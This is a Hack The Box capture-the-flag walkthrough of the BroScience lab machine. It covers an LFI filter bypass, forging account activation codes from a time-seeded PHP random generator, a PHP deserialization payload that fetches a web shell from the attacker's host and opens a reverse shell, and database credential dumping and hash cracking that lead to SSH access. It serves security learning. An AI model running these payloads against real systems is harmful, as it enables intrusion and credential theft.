# Hack The Box - BroScience Walkthrough

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ sudo nmap -sC -sV -oA nmap/tcp -p- --min-rate 1500 10.10.11.195
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 09:49 EDT
Nmap scan report for 10.10.11.195
Host is up (0.19s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: BroScience : Home
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.66 seconds
```

Before starting the enumeration, I wanted to check if any other ports were open, so I ran `rustscan` to quickly check if any other ports were open.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ rustscan -a 10.10.11.195 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.195:22
Open 10.10.11.195:80
Open 10.10.11.195:443
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80,443 10.10.11.195

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 09:51 EDT
Initiating Ping Scan at 09:51
Scanning 10.10.11.195 [2 ports]
Completed Ping Scan at 09:51, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:51
Completed Parallel DNS resolution of 1 host. at 09:51, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:51
Scanning 10.10.11.195 [3 ports]
Discovered open port 80/tcp on 10.10.11.195
Discovered open port 22/tcp on 10.10.11.195
Discovered open port 443/tcp on 10.10.11.195
Completed Connect Scan at 09:51, 0.19s elapsed (3 total ports)
Nmap scan report for 10.10.11.195
Host is up, received syn-ack (0.19s latency).
Scanned at 2023-03-22 09:51:09 EDT for 0s

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Both `Nmap` & `rustscan` reported `3` ports to be open:
- port `22`: running `OpenSSH 8.4p1`
- port `80`: running `Apache httpd 2.4.54`
- port `445`: running `Apache httpd 2.4.54`

`Nmap` scan also showed the host name as `broscience.htb` on port `80`. So I added the host to my `/etc/hosts` file.

```
sudo echo '10.10.11.195  broscience.htb' >> /etc/hosts
```

## Enumeration
Visiting the website on port `80`, I saw that I was redirected to port `443` i.e `https` 

![image](https://user-images.githubusercontent.com/87711310/226926885-765b3836-3733-4dc5-80d1-f23d6127c02b.png)

Viewing the SSL certificate, I found an email address that the website contains.

![image](https://user-images.githubusercontent.com/87711310/226927356-ce3aeaa2-f626-48a0-a995-a95a820a0751.png)

On clicking one of the articles written by admin, I was redirected to another page and found out this info

![image](https://user-images.githubusercontent.com/87711310/226935305-38e4b9f2-84b2-42c6-917b-b28d8e2f5750.png)

Using the `id` parameter, I was able to view the users with different ids.

![image](https://user-images.githubusercontent.com/87711310/226935643-985b33bb-4f54-48cf-b597-20c560b7c70e.png)

![image](https://user-images.githubusercontent.com/87711310/226935735-e0d8875f-42f4-4cd4-a2bc-051494eb01c9.png)

So, the list of user's on the web page were: 
- administrator
- bill
- micheal
- john
- dmytro

So, next obvious step was to try and brute-force the credentials with `hydra`.

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 443 broscience.htb https-post-form "/login.php:username=^USER^&password=^PASS^:danger"
```

But, it didn't work.

On further enumerating the website, I found out that the images were not referenced directly but rather fetched using a potential LFI in PHP, i.e. `/includes/img.php?path=bench.png`

So, I started with basic LFI payloads, trying anything with `../` displays `Error: Attack detected.`

After trying to bypass the LFI for a while, I was unable to do it. So, I decided to take a step back, and try something else.

So, firstly, I decided to enumerate directories using `ffuf`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u https://broscience.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://broscience.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
.hta.php                [Status: 403, Size: 280, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10]
.htpasswd.php           [Status: 403, Size: 280, Words: 20, Lines: 10]
.htaccess.php           [Status: 403, Size: 280, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10]
activate.php            [Status: 200, Size: 1256, Words: 293, Lines: 28]
comment.php             [Status: 302, Size: 13, Words: 3, Lines: 1]
images                  [Status: 301, Size: 319, Words: 20, Lines: 10]
includes                [Status: 301, Size: 321, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 9308, Words: 3953, Lines: 147]
index.php               [Status: 200, Size: 9308, Words: 3953, Lines: 147]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10]
login.php               [Status: 200, Size: 1936, Words: 567, Lines: 42]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
manual                  [Status: 301, Size: 319, Words: 20, Lines: 10]
register.php            [Status: 200, Size: 2161, Words: 635, Lines: 45]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
styles                  [Status: 301, Size: 319, Words: 20, Lines: 10]
user.php                [Status: 200, Size: 1309, Words: 300, Lines: 29]
:: Progress: [4713/4713] :: Job [1/1] :: 138 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

`Ffuf` resulted back some interesting directories, so I visited them.

![image](https://user-images.githubusercontent.com/87711310/227706025-43206459-82e7-483d-9150-97251e1f4770.png)

There was this registration page on `/register.php`. I entered the details and after registering I got a message.

![image](https://user-images.githubusercontent.com/87711310/227706080-79cbc9bb-b38f-46bb-9ee1-4921045da025.png)

Now, I did not know where was the activation link email, so I just ignored it and tried to login using the registered credentials.

![image](https://user-images.githubusercontent.com/87711310/227706245-c614576a-57db-4657-a508-a2d9ef7a60ae.png)

I was not able to log into the website as my account was not activated.

`Ffuf` also listed that it found `activate.php`, so I visited it too.

![image](https://user-images.githubusercontent.com/87711310/227706317-bf82c240-cdc7-4c68-9f8e-f29b268886a9.png)


I think there a parameter that contains an input which is missing. I found this tool called [Arjun](https://github.com/s0md3v/Arjun) (It's pre-installed in Kali, but I was unaware of it). So `Arjun` basically finds query parameters for URL endpoints.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ arjun -u https://broscience.htb/activate.php?
/home/kali/.local/lib/python3.10/site-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (1.26.5) or chardet (5.1.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: code, based on: body length
[+] Parameters found: code
```

It found a code parameter.

Now, remember that I found `user.php` page which took in a parameter, so I decided to use it to determine what parameter is used.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ arjun -u https://broscience.htb/user.php?
/home/kali/.local/lib/python3.10/site-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (1.26.5) or chardet (5.1.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
    _
   /_| _ '                                                                                                                                                  
  (  |/ /(//) v2.2.1                                                                                                                                        
      _/                                                                                                                                                    

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: id, based on: body length
[+] Parameters found: id
```

So, I figured out that this was an `alternative method` of finding out usernames using the `id` parameter.

Then, I visited the `/includes` directory.

![image](https://user-images.githubusercontent.com/87711310/227706945-9bb9c9b9-3b16-4ca1-9871-bd1bccd62480.png)

I tried to open these files, but got an error.

![image](https://user-images.githubusercontent.com/87711310/227706967-db569593-1084-4bda-95e6-6a40601d6610.png)

I tested to confirm that LFI also existed on these pages too.

![image](https://user-images.githubusercontent.com/87711310/227707019-18f09b6b-4898-433a-b330-4e22e8680e7b.png)

Now, I thought of trying something silly but useful in ctfs, I double encoded the `path` parameter and send the request. This worked!! It was such a silly mistake to not check for basic LFI bypasses.

![image](https://user-images.githubusercontent.com/87711310/227707192-8ce38d67-d2d4-4aac-b8f4-ee802bd6728b.png)

I was able to retreive the code of `login.php` using the double encoding method.

So, now, it was time for code review. I retrieved the code and strated going through it.

```php
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
    header('Location: /index.php');
}

if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
    if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
        // Check for code in database
        include_once 'includes/db_connect.php';

        $res = pg_prepare($db_conn, "check_code_query", 'SELECT id, is_activated::int FROM users WHERE activation_code=$1');
        $res = pg_execute($db_conn, "check_code_query", array($_GET['code']));

        if (pg_num_rows($res) == 1) {
            // Check if account already activated
            $row = pg_fetch_row($res);
            if (!(bool)$row[1]) {
                // Activate account
                $res = pg_prepare($db_conn, "activate_account_query", 'UPDATE users SET is_activated=TRUE WHERE id=$1');
                $res = pg_execute($db_conn, "activate_account_query", array($row[0]));
                
                $alert = "Account activated!";
                $alert_type = "success";
            } else {
                $alert = 'Account already activated.';
            }
        } else {
            $alert = "Invalid activation code.";
        }
    } else {
        $alert = "Invalid activation code.";
    }
} else {
    $alert = "Missing activation code.";
}
?>

<html>
    <head>
        <title>BroScience : Activate account</title>
        <?php include_once 'includes/header.php'; ?>
    </head>
    <body>
        <?php include_once 'includes/navbar.php'; ?>
        <div class="uk-container uk-container-xsmall">
            <?php
            // Display any alerts
            if (isset($alert)) {
            ?>
                <div uk-alert class="uk-alert-<?php if(isset($alert_type)){echo $alert_type;}else{echo 'danger';} ?>">
                    <a class="uk-alert-close" uk-close></a>
                    <?=$alert?>
                </div>
            <?php
            }
            ?>
        </div>
    </body>
</html>
```

Going through the code I found out that the activation code is `32` characters long.  

Then, I retrieved the `register.php` to look at how the `activation code` was generated.

```php
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
    header('Location: /index.php');
}

// Handle a submitted register form
if (isset($_POST['username']) && isset($_POST['email']) && isset($_POST['password']) && isset($_POST['password-confirm'])) {
    // Check if variables are empty
    if (!empty($_POST['username']) && !empty($_POST['email']) && !empty($_POST['password']) && !empty($_POST['password-confirm'])) {
        // Check if passwords match
        if (strcmp($_POST['password'], $_POST['password-confirm']) == 0) {
            // Check if email is too long
            if (strlen($_POST['email']) <= 100) {
                // Check if email is valid
                if (filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
                    // Check if username is valid
                    if (strlen($_POST['username']) <= 100) {
                        // Check if user exists already    
                        include_once 'includes/db_connect.php';

                        $res = pg_prepare($db_conn, "check_username_query", 'SELECT id FROM users WHERE username = $1');
                        $res = pg_execute($db_conn, "check_username_query", array($_POST['username']));
                        
                        if (pg_num_rows($res) == 0) {
                            // Check if email is registered already
                            $res = pg_prepare($db_conn, "check_email_query", 'SELECT id FROM users WHERE email = $1');
                            $res = pg_execute($db_conn, "check_email_query", array($_POST['email']));

                            if (pg_num_rows($res) == 0) {
                                // Create the account
                                include_once 'includes/utils.php';
                                $activation_code = generate_activation_code();
                                $res = pg_prepare($db_conn, "check_code_unique_query", 'SELECT id FROM users WHERE activation_code = $1');
                                $res = pg_execute($db_conn, "check_code_unique_query", array($activation_code));

                                if (pg_num_rows($res) == 0) {
                                    $res = pg_prepare($db_conn, "create_user_query", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');
                                    $res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));

                                    // TODO: Send the activation link to email
                                    $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";

                                    $alert = "Account created. Please check your email for the activation link.";
                                    $alert_type = "success";
                                } else {
                                    $alert = "Failed to generate a valid activation code, please try again.";
                                }
                            } else {
                                $alert = "An account with this email already exists.";
                            }
                        }
                        else {
                            $alert = "Username is already taken.";
                        }
                    } else {
                        $alert = "Maximum username length is 100 characters.";
                    }
                } else {
                    $alert = "Please enter a valid email address.";
                }
            } else {
                $alert = "Maximum email length is 100 characters.";
            }
        } else {
            $alert = "Passwords do not match.";
        }
    } else {
        $alert = "Please fill all fields in.";
    }
}
?>
```

Analyzing the code, I found a name of the function that is responsible for generating the activation code: `generate_Activation_code`. This was retrieved from `utils.php` file, so, I decided to retrieve and take a look at it.

![image](https://user-images.githubusercontent.com/87711310/227709503-748f2349-0b4c-4d2d-bd43-10952906daba.png)


```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```


I used `chatGPT` to decode it and understand its meaning.
```
The code defines a function called generate_activation_code() that generates a random 32-character activation code.

Here's a breakdown of how the function works:

1. The function starts by defining a string of characters called $chars. This string contains all lowercase and uppercase letters of the English alphabet, as well as digits 0-9.
2. The srand() function is called with time() as its argument to seed the random number generator with the current time.
3. An empty string variable called $activation_code is defined.
4. A for loop is used to generate the activation code one character at a time. The loop runs 32 times, which is the length of the activation code.
5. Within the loop, rand() is used to generate a random integer between 0 and the length of $chars minus 1. This integer is used as an index to select a random character from the $chars string.
6. The selected character is appended to $activation_code.
7. After the loop has finished running, the function returns the generated $activation_code.

So, when you call the generate_activation_code() function, it will return a random 32-character string that can be used as an activation code for some kind of software or service.

```

So now, all I had to do was to generate a valid code. I could do that if I had an exact time when the rerquest was issued using the same code.

I got the date and time using the Inspector tab from Burp.

![image](https://user-images.githubusercontent.com/87711310/227714207-85988aeb-849a-4eb4-8e32-6a7d7b2dbbb3.png)

Then I added the same date and time in the code, modified it a bit and it's as follow: 

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(strtotime("Sat, 25 Mar 2023 11:12:58 GMT"));
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo $activation_code;
}
generate_activation_code()
?>
```

The response after running the script was: 

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ php code-script.php  
jzJphAWR1c6h7bvAibTQBZOHCpzxI1Um 
```

So now, If I input this string using the `code` parameter on `/activate.php` page, my account would prolly be activated.

![image](https://user-images.githubusercontent.com/87711310/227714357-de5a8b35-6f1c-4ffd-9e60-52abdd56a560.png)

It did work!!

![image](https://user-images.githubusercontent.com/87711310/227717334-d3a905b9-ac70-4778-a3c3-356033f0bd41.png)

I used cookie editor to look at the cookie of the logged in user.

![image](https://user-images.githubusercontent.com/87711310/227717148-a4117ec8-7681-4a77-8e0d-f8a5aa4c3505.png)

After going throught the code of `includes/utils.php`, I found that a user-pref cookie is generated through serialization techinique which stores the information about the theme and state.

```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
```

The avatar class has a parameter `img path` which is used to point to the path of the image and a `tmp` parameter opens the img and saves its content on the server.

The avatar interface has a method/function named `__wakeup()` which creates a new instance of avatar class and a class save method for the the avatar class.

So theoretically if I was able to set the `img-path` to my server and make it receive a PHP shell the `tmp` path will store it on the server and I could trigger a reverse shell after visiting it.

So, the modified payload is:

```php
<?php
class Avatar {
    public $imgPath;
    
    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.11:8081/shell.php";
    public $imgPath = "./shell.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}    
$payload = base64_encode(serialize(new AvatarInterface));
echo $payload
?>
```

Now, running this script will output a string which is identical to the cookie string .

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ php script-to-generate-serialized-paylaod.php 
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozMzoiaHR0cDovLzEwLjEwLjE0LjExOjgwODEvc2hlbGwucGhwIjtzOjc6ImltZ1BhdGgiO3M6MTE6Ii4vc2hlbGwucGhwIjt9==
```

So, now that the serialized cookie is generated, I hosted a python server, replaced the cookie and turned on the `netcat` listener.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ python -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.195 - - [25/Mar/2023 09:05:22] "GET /shell.php HTTP/1.0" 200 -
```

and then visiting the `https://broscience.htb/shell.php` will invoke the shell.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ nc -lvnp 1337                                
listening on [any] 1337 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.195] 42142
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
 09:13:00 up 1 day,  6:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Upgrading to a better shell.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@broscience:/$ ls
ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
www-data@broscience:/$ pwd
pwd
/
```

Trying to grab the user flag.

```
www-data@broscience:/$ cd home
cd home
lswww-data@broscience:/home$ 
ls
bill
www-data@broscience:/home$ cd bill
cd bill
www-data@broscience:/home/bill$ ls
ls
Certs    Documents  Music     Public     Videos
Desktop  Downloads  Pictures  Templates  user.txt
www-data@broscience:/home/bill$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

So, now I needed to escalate my privileges horizontally first.

The first thing I visited was the `db_connect.php` file which I saw on the web in the `/includes` directory.

```
www-data@broscience:/home/bill$ cd /var/www/html/includes
cd /var/www/html/includes
www-data@broscience:/var/www/html/includes$ ls
ls
db_connect.php  header.php  img.php  navbar.php  utils.php
www-data@broscience:/var/www/html/includes$ cat db_connect.php
cat db_connect.php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
```

I had the credentials of `dbuser` and its password. So, I tried logging into the service on the specified port.

```
?>www-data@broscience:/var/www/html/includes$ psql -h localhost -p 5432 -U dbuser -d broscience
<$ psql -h localhost -p 5432 -U dbuser -d broscience
Password for user dbuser: RangeOfMotion%777

psql (13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

broscience=> 
```

And I was in!!

Next, I listed down all the tables in the database using the `\dt` command.

```
broscience-> \dt
\dt
WARNING: terminal is not fully functional
-  (press RETURN)
           List of relations
 Schema |   Name    | Type  |  Owner   
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres
(3 rows)
```

Then, using `TABLE users;` query, I dumped all the content of the `users` table.

```
broscience=> TABLE users;
TABLE users;
1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t | t| 2019-03-07 02:02:22.226763-05
2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb    | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t | f | 2019-05-07 03:34:44.127644-04
3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t | f | 2020-10-01 04:12:34.732872-04
4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb    | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t | f | 2021-09-21 11:45:53.118482-04
5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb  | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t | f | 2021-08-13 10:34:36.226763-04
(5 rows)

```

So, I quickly copied these hashes in a text file in the `hash:salt` format. The salt (NaCl) was mentioned in the `db_connect.php` file.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ cat hashes                    
15657792073e8a843d4f91fc403454e1:NaCl
13edad4932da9dbb57d9cd15b66ed104:NaCl
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
a7eed23a7be6fe0d765197b1027453fe:NaCl
5d15340bded5b9395d5d14b9c21bc82b:NaCl
```

Then I ran `hashcat` to crack the hashes.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ hashcat -m 20 hashes /usr/share/wordlists/rockyou.txt 
...[snip]...
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest     
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples 
...[snip]...
```

`Hashcat` was able to crack 3 hashes.

The only user name I had was `bill`. So, I tried `ssh-ing` into bill's using the cracked hash.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
└─$ ssh bill@broscience.htb  
The authenticity of host 'broscience.htb (10.10.11.195)' can't be established.
ED25519 key fingerprint is SHA256:qQRm/99RG60gqk9HTpyf93940WYoqJEnH+MDvJXkM6E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'broscience.htb' (ED25519) to the list of known hosts.
bill@broscience.htb's password: 
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40
bill@broscience:~$ whoami
bill
```

And it worked!!

So, now, grabbing the user flag.

```
bill@broscience:~$ cat user.txt 
[REDACTED]
```

## Privilege Escalation
Running `pspy64` on the machine, I got this following results.

So, there was this interesting process that was running.

![image](https://user-images.githubusercontent.com/87711310/227724889-f5ad2427-9cf7-48dc-8d81-06a636bd6873.png)

So, Viewing what `renew.sh` does.

```
bill@broscience:~$ cat /opt/renew_cert.sh 
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

Bill:iluvhorsesandgym
